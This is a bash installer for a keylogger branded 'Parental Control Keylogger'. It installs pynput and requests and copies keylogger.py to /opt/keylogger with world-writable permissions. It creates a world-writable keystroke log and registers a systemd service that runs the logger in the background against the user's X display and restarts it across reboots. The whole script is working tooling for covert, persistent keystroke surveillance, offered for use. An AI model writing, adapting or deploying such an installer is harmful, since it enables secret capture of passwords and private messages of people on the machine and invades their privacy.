#!/bin/bash

LOG_FILE="/var/log/keylogger_install.log"

echo "======================================="
echo "  🔥 Parental Control Keylogger 🔥"
echo "  Created by: Sarfas"
echo "  GitHub: github.com/sarfasnp"
echo "=======================================" 

echo "[*] Starting installation..." | tee -a "$LOG_FILE"

# Detect the logged-in user
USER_NAME=$(logname)
USER_HOME=$(eval echo ~$USER_NAME)

# Ensure the script runs as root
if [[ $EUID -ne 0 ]]; then
   echo "[!] This script must be run as root!" | tee -a "$LOG_FILE"
   exit 1
fi

# Update package list and install required packages
echo "[*] Installing dependencies..." | tee -a "$LOG_FILE"
sudo apt update >> "$LOG_FILE" 2>&1
sudo apt install -y python3 python3-pip x11-xserver-utils >> "$LOG_FILE" 2>&1

# Ensure pip is installed
if ! command -v pip3 &> /dev/null; then
    echo "[!] pip3 not found! Installing it now..." | tee -a "$LOG_FILE"
    sudo apt install -y python3-pip >> "$LOG_FILE" 2>&1
fi

# Install required Python modules
echo "[*] Installing Python modules..." | tee -a "$LOG_FILE"
pip3 install --break-system-packages pynput requests >> "$LOG_FILE" 2>&1

# Copy the keylogger to a system-wide location
INSTALL_DIR="/opt/keylogger"
echo "[*] Copying keylogger to $INSTALL_DIR/" | tee -a "$LOG_FILE"
sudo mkdir -p "$INSTALL_DIR"
sudo cp keylogger.py "$INSTALL_DIR/keylogger.py"
sudo chmod 777 "$INSTALL_DIR/keylogger.py"  # Set full permissions for the script

# Ensure log directory exists
LOG_DIR="/var/log/keylogger"
echo "[*] Creating log directory at $LOG_DIR..." | tee -a "$LOG_FILE"
sudo mkdir -p "$LOG_DIR"
sudo touch "$LOG_DIR/keylog.txt"
sudo chmod 666 "$LOG_DIR/keylog.txt"  # Set full permissions for the log file

# Auto-detect DISPLAY value
DISPLAY_VALUE=$(sudo -u "$USER_NAME" bash -c 'echo $DISPLAY')
if [[ -z "$DISPLAY_VALUE" ]]; then
    DISPLAY_VALUE=":0"  # Default display value
fi

# Create systemd service for persistence
echo "[*] Creating systemd service..." | tee -a "$LOG_FILE"
cat <<EOF | sudo tee /etc/systemd/system/keylogger.service > /dev/null
[Unit]
Description=Parental Control Keylogger
After=multi-user.target
Wants=multi-user.target

[Service]
ExecStartPre=/bin/sleep 5
ExecStart=/usr/bin/python3 $INSTALL_DIR/keylogger.py
Restart=always
User=$USER_NAME
Environment="DISPLAY=$DISPLAY_VALUE"
Environment="XDG_SESSION_TYPE=x11"
Environment="XAUTHORITY=$USER_HOME/.Xauthority"
StandardOutput=file:/var/log/keylogger/keylogger_output.log
StandardError=file:/var/log/keylogger/keylogger_error.log

[Install]
WantedBy=multi-user.target
EOF

# Reload systemd, enable and start service
echo "[*] Enabling and starting keylogger service..." | tee -a "$LOG_FILE"
sudo systemctl daemon-reload
sudo systemctl enable keylogger.service >> "$LOG_FILE" 2>&1
sudo systemctl start keylogger.service >> "$LOG_FILE" 2>&1

echo "[✔] Installation complete! The keylogger is now running in the background and will persist after reboot." | tee -a "$LOG_FILE"
